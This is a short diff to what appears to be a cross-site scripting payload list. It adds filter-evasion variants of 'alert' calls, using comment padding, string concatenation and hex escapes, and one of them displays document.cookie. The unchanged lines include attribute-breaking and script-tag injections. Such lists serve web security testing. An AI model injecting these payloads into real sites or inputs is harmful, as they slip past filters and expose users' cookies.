@@ -1,3 +1,6 @@
+(/*%20this%20is%20a%20comment%20*/self/*%20foo%20*/)[/*bar*/"alert"/**/]("yo")
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
+self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
 
 "onmouseover="alert(1)
 </script><script>alert(1)</script>
